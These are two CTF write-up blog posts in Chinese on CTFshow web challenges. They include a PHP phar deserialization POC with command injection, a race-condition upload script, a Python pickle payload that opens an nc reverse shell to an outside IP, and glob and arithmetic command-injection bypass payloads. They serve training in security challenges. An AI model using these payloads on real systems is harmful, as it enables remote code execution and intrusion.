<p>phar文件本质上是一种压缩文件，会以序列化的形式存储用户自定义的meta-data。当受影响的文件操作函数调用phar文件时，会自动反序列化meta-data内的内容。</p>
<p>如何生成一个phar文件？</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> Test();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>漏洞利用条件</p>
<pre><code>phar文件要能够上传到服务器端。
要有可用的魔术方法作为“跳板”。
文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。
</code></pre>
<p>受影响的函数,知道创宇测试后受影响的函数列表：</p>
<p><img src="/2022/03/20/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220323203908852.png" alt="image-20220323203908852"></p>
<p>首先上传一个p.phar文件，然后在该文件没有被删除之前再发一个包，传入的参数是<code>fn=phar://p.phar/test</code>，当对其调用<code>unlink()</code>时，会对之前传入的并写进p.phar中的内容进行反序列化，从而进行析构函数的调用，类似于：</p>
<p><img src="/2022/03/20/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220323204943994.png" alt="image-20220323204943994"></p>
<p>注意：前面一定要有<code>phar://</code>以及后面跟上<code>/</code>加一串随机字符串。</p>
<p>这样我们只要保证生成的phar文件在析构的时候可以进行命令拼接即可。生成phar文件的POC如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filter</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&#x27;;cat fl*&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evilfile</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 后缀必须为phar</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;evil.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="comment">// 设置 stubb, 增加 gif 文件头</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> filter();</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将自定义的 meta-data 存入 manifest</span></span><br><span class="line"><span class="comment"> * 这个函数需要在php.ini中修改 phar.readonly 为 Off</span></span><br><span class="line"><span class="comment"> * 否则的话会抛出 </span></span><br><span class="line"><span class="comment"> * creating archive &quot;***.phar&quot; disabled by the php.ini setting phar.readonly </span></span><br><span class="line"><span class="comment"> * 异常.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>);</span><br><span class="line"><span class="comment">// 添加需压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">访问此php文件就可生成</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/20/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220323211608489.png" alt="image-20220323211608489"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">竞争脚本如下：</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">flag = <span class="literal">False</span></span><br><span class="line">url = <span class="string">&#x27;http://8912b458-d676-484e-839c-e35d2e3705d9.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line">data = <span class="built_in">open</span>(<span class="string">&#x27;evil.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>():</span></span><br><span class="line">    requests.post(url+<span class="string">&quot;?fn=p.phar&quot;</span>, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>():</span></span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    r = requests.post(url+<span class="string">&quot;?fn=phar://p.phar/test&quot;</span>, data=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;ctfshow&#123;&quot;</span> <span class="keyword">in</span> r.text <span class="keyword">and</span> flag <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        flag = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> flag <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">    a = threading.Thread(target=upload)</span><br><span class="line">    b = threading.Thread(target=read)</span><br><span class="line">    a.start()</span><br><span class="line">    b.start()</span><br></pre></td></tr></table></figure>

<h3 id="web277-278"><a href="#web277-278" class="headerlink" title="web277-278"></a>web277-278</h3><p><img src="/2022/03/20/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220404143929906.png" alt="image-20220404143929906"></p>
<p>python反序列化</p>
<p>在/backdoor 下传data,会把传入的<code>data</code>参数进行base64解码后反序列化，所以使用<code>__reduce__()</code>魔术方法进行命令执行获得shell</p>
<p>问题是：一个就是没有回显，另外一个就是os.system用不了，过滤了，用os.popen就可以了。因为没回显，所以弹一下shell，bash弹不了，用nc：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (os.popen,(<span class="string">&#x27;nc 42.192.214.161 7777 -e /bin/sh&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">a=exp()</span><br><span class="line">b=pickle.dumps(a)</span><br><span class="line">s=base64.b64encode(b)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line">/backdoor?data=gANjb3MKcG9wZW4KcQBYIQAAAG5jIDQyLjE5Mi4yMTQuMTYxIDc3NzcgLWUgL2Jpbi9zaHEBhXECUnEDLg==</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/20/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220404160237421.png" alt="image-20220404160237421"></p>
<h3 id="可以执行shell命令的方法"><a href="#可以执行shell命令的方法" class="headerlink" title="可以执行shell命令的方法"></a>可以执行shell命令的方法</h3><p><strong>os模块：</strong></p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">os</span>.system </span><br><span class="line"></span><br><span class="line"> <span class="built_in">os</span>.<span class="built_in">popen</span>：该方法以文件的形式返回shell指令运行后的结果，需要获取内容时可使用<span class="built_in">read</span>()或readlines（）方法</span><br></pre></td></tr></table></figure>

<p><strong>commans模块</strong></p>
<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">commands.getstatusou<span class="meta">tput(</span>cmd):其以字符串的形式返回的是输出结果和状态码，即（status,<span class="meta">output</span>）。</span><br><span class="line"></span><br><span class="line">commands.getou<span class="meta">tput(</span>cmd)，返回cmd的输出结果。</span><br><span class="line"></span><br><span class="line">commands.getstatus(<span class="meta">file</span>)，返回ls -l <span class="meta">file</span>的执行结果字符串，调用了getoutput，不建议使用此方法</span><br></pre></td></tr></table></figure>

<p><strong>subprocess模块</strong></p>
<pre><code>subprocess.call(command, shell=True) 会直接打印出结果
subprocess.Popen(command, shell=True) 也可以是subprocess.Popen(command, stdout=subprocess.PIPE, shell=True) 这样就可以输出结果了。
</code></pre>
<p>如果command不是一个可执行文件，shell=True是不可省略的。<br>shell=True意思是shell下执行command</p>
<p> v    </p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/11/CTFshow2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CJ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Echo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/03/11/CTFshow2/" class="post-title-link" itemprop="url">CTFshow2</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-03-11 22:46:55" itemprop="dateCreated datePublished" datetime="2022-03-11T22:46:55+08:00">2022-03-11</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-03-29 23:57:42" itemprop="dateModified" datetime="2022-03-29T23:57:42+08:00">2022-03-29</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Symbols count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Symbols count in article: </span>
      <span>13k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>12 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h2><p><img src="/2022/03/11/CTFshow2/image-20220129131445382-16470100546731.png" alt="image-20220129131445382"></p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">还是查看源代码发现没有过滤数字，我们就想一想在我们查看文件的命令有没有数字开头的。发现存在一个<span class="built_in">base64</span></span><br></pre></td></tr></table></figure>

<p><strong>base64的使用</strong></p>
<p>我们就可以通过通配符进行匹配命令执行查看flag.php</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：`?c=<span class="regexp">/???/</span>????<span class="number">64</span> ????.???`</span><br><span class="line"> 意思是 `<span class="regexp">/bin/</span>base64 flag.php`</span><br></pre></td></tr></table></figure>

<p>bin为binary的简写主要放置一些 <a target="_blank" rel="noopener" href="http://www.2cto.com/os/">系统</a>的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64,bzip2等</p>
<p>这里我们可以利用 base64 中的64 进行通配符匹配  即 /bin/base64 flag.php</p>
<p><strong>bzip2的使用</strong></p>
<p>bzip2是linux下面的压缩文件的命令<br>我们可以通过该命令压缩flag.php 然后进行下载</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：<span class="string">?c</span>=<span class="regexp">/???/</span><span class="string">??</span><span class="string">?/</span><span class="string">??</span><span class="string">??</span><span class="number">2</span> <span class="string">??</span><span class="string">??</span>.<span class="string">??</span>?    <span class="string">?c</span>=<span class="regexp">/???/</span><span class="string">??</span><span class="string">??</span><span class="number">2</span> <span class="string">??</span><span class="string">??</span>.<span class="string">??</span>?</span><br><span class="line">也就是/usr/bin/bzip2 flag.php</span><br></pre></td></tr></table></figure>

<p>然后访问/flag.php.bz2进行下载获得flag.php<br><img src="/2022/03/11/CTFshow2/image-20220129132748483-16470100546742.png" alt="image-20220129132748483"></p>
<h2 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h2><p><img src="/2022/03/11/CTFshow2/image-20220129140232817-16470100546753.png" alt="image-20220129140232817"></p>
<p>无字母数字</p>
<p>使用<code>^</code>以及| 运算符进行拼接命令然后执行。然后发现其他改变就是不会执行也不是<code>eval()</code>函数，然后就失败了  </p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></p>
<p><code>.</code>或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则<code>. file</code>的意思就是用bash执行file文件中的命令。</p>
<p>可以通过post一个文件(文件里面的sh命令)，在上传的过程中，通过.(点)去执行执行这个文件。(形成了条件竞争)。一般来说这个文件在linux下面保存在/tmp/php??????一般后面的6个字符是随机生成的有大小写。（可以通过linux的匹配符去匹配）<br>注意：通过.去执行sh命令不需要有执行权限<br>在这个之前我们需要构造一个post上传文件的数据包。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/11/CTFshow2/image-20220129160319559-16470100546754.png" alt="image-20220129160319559"></p>
<p>随便提交个文件bp抓包</p>
<p><img src="/2022/03/11/CTFshow2/image-20220129161423503-16470100546755.png" alt="image-20220129161423503"></p>
<p>构造poc执行命令，原因详见 <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></p>
<p>所有文件名都是小写，只有PHP生成的临时文件包含大写字母。那么答案就呼之欲出了，我们只要找到一个可以表示“大写字母”的glob通配符，就能精准找到我们要执行的文件。</p>
<p>翻开ascii码表，可见大写字母位于<code>@</code>与<code>[</code>之间：我们可以利用<code>[@-[]</code>来表示大写字母：</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">?c</span>=.+<span class="regexp">/???/</span><span class="string">??</span><span class="string">??</span><span class="string">??</span><span class="string">??</span>[@-[]</span><br><span class="line">+<span class="symbol">:</span>空格的意思，也可以用空格编码%<span class="number">20</span>                     空格 + %<span class="number">20</span> 都可以表示空格</span><br></pre></td></tr></table></figure>

<p>123为1.txt的内容  然后在上传文件内容添加sh命令                                   </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">ls</span><br></pre></td></tr></table></figure>

<p>1、linux shell脚本中，# 是注释符号。#！是不同于#的另外一种特殊的表示符号。</p>
<p>2、#！后面是解释此脚本的shell路径。shell程序必须以”#!/bin/sh”开始</p>
<p>3、shell的种类有很多，可以通过 </p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="regexp">/etc/</span>shells</span><br></pre></td></tr></table></figure>

<p>查看shell的种类。</p>
<pre><code>/bin/sh
/bin/bash
/bin/rbash
/bin/dash
</code></pre>
<p>4、脚本的内容是由解释器进行解释，可以用各种各样的解释器来写对应的脚本。<br><img src="/2022/03/11/CTFshow2/image-20220129161233495-16470100546756.png" alt="image-20220129161233495"></p>
<p><img src="/2022/03/11/CTFshow2/image-20220129161304870-16470100546757.png" alt="image-20220129161304870"></p>
<p>点两次send就有反映了。</p>
<p><strong>说明一下为什么在使用eval()函数有时候需要添加?&gt;</strong></p>
<p>原因是eval()函数相当于执行php的代码，而&lt;?= 就相当于&lt;?php echo<br>在PHP7以上不管short_open_tag配置是不是开启的。都可以使用。<br>所以就相当于一个新的PHP文件，这样的话就需要将最开始前面的&lt;?php给闭合，不然不会执行。<br>闭合之后就相当于</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?=</span>`ls`;</span><br></pre></td></tr></table></figure>



<h2 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h2><p><img src="/2022/03/11/CTFshow2/image-20220129213051789-16470100546758.png" alt="image-20220129213051789"></p>
<p>要构造出36</p>
<p>没有过滤$ {} _  ()              </p>
<p>知识点是$(( ))与整数运算。想办法构造出36.</p>
<p>双小括号 (( )) 是 Bash Shell 中专门用来进行整数运算的命令，它的效率很高，写法灵活，是企业运维中常用的运算命令。<br>通俗地讲，就是将数学运算表达式放在((和))之间。</p>
<p>表达式可以只有一个，也可以有多个，多个表达式之间以逗号,分隔。对于多个表达式的情况，以最后一个表达式的值作为整个 (( ))命令的执行结果。</p>
<p>可以使用$获取 (( )) 命令的结果，这和使用$获得变量值是类似的。</p>
<p>可以在 (( )) 前面加上$符号获取 (( )) 命令的执行结果，也即获取整个表达式的值。以 c=$((a+b)) 为例，即将 a+b 这个表达式的运算结果赋值给变量 c。</p>
<p>注意，类似 c=((a+b)) 这样的写法是错误的，不加$就不能取得表达式的结果。</p>
<p><code>$(())</code>的值是0   如果b=<del>a，那么a+b=-1。若a=0,</del>0=-1因此：若要获得36，就要对-37取反</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$((~$(())))   ~<span class="number">0</span>=<span class="number">-1</span></span><br></pre></td></tr></table></figure>

<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$</span>(( <span class="symbol">$</span>((~<span class="symbol">$</span>(()))) <span class="symbol">$</span>((~<span class="symbol">$</span>(()))) ))   #<span class="symbol">$</span>((<span class="number">-1</span><span class="number">-1</span>))即<span class="symbol">$</span><span class="symbol">$</span>((<span class="number">-2</span>))是<span class="number">-2</span></span><br></pre></td></tr></table></figure>

<p>因此在里面放37个<code>$((~$(())))</code>，就可以得到-37，然后取反就可以了。  </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">((~$((-<span class="number">37</span>))))</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">$</span><span class="bash">((~$((     $((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))) ))))</span></span><br></pre></td></tr></table></figure>

<p>再查看源代码即可</p>
<h2 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h2><p>命令执行，突破禁用函数</p>
<p><img src="/2022/03/11/CTFshow2/image-20220130150100192-16470100546759.png" alt="image-20220130150100192"></p>
<p>查看禁用了那些函数   c=phpinfo(); phpinfo被禁了 ；一个一个试 system ，shell_exec() 被禁用了                                                                                        </p>
<p>以下可用：         </p>
<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">show_source</span>() 函数对文件进行语法高亮显示。                                                        <span class="variable">echo</span> <span class="title">file_get_contents</span>()                                                                      <span class="variable">echo</span> <span class="title">highlight_file</span>()                                                                   <span class="variable">highlight_file</span>     </span></span><br><span class="line"><span class="function"><span class="title"><span class="built_in">readfile</span></span>()																</span></span><br><span class="line"><span class="function"><span class="variable">payload</span>: <span class="variable">c</span>=<span class="title">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);</span></span><br></pre></td></tr></table></figure>



<h2 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h2><p><img src="/2022/03/11/CTFshow2/image-20220130152826193-164701005467510.png" alt="image-20220130152826193"></p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: c=<span class="built_in">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>



<h2 id="web60"><a href="#web60" class="headerlink" title="web60"></a>web60</h2><p><img src="/2022/03/11/CTFshow2/image-20220130152953552-164701005467511.png" alt="image-20220130152953552"></p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: c=<span class="built_in">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>



<h2 id="web61"><a href="#web61" class="headerlink" title="web61"></a>web61</h2><p><img src="/2022/03/11/CTFshow2/image-20220130152953552-164701005467511.png" alt="image-20220130152953552"></p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: c=<span class="built_in">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>



<h2 id="web62"><a href="#web62" class="headerlink" title="web62"></a>web62</h2><p><img src="/2022/03/11/CTFshow2/image-20220130152953552-164701005467511.png" alt="image-20220130152953552"></p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: c=<span class="built_in">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>



<h2 id="web63"><a href="#web63" class="headerlink" title="web63"></a>web63</h2><p><img src="/2022/03/11/CTFshow2/image-20220130152953552-164701005467511.png" alt="image-20220130152953552"></p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: c=<span class="built_in">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>



<h2 id="web64"><a href="#web64" class="headerlink" title="web64"></a>web64</h2><p><img src="/2022/03/11/CTFshow2/image-20220130152953552-164701005467511.png" alt="image-20220130152953552"></p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: c=<span class="built_in">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>



<h2 id="web65"><a href="#web65" class="headerlink" title="web65"></a>web65</h2><p><img src="/2022/03/11/CTFshow2/image-20220130152953552-164701005467511.png" alt="image-20220130152953552"></p>
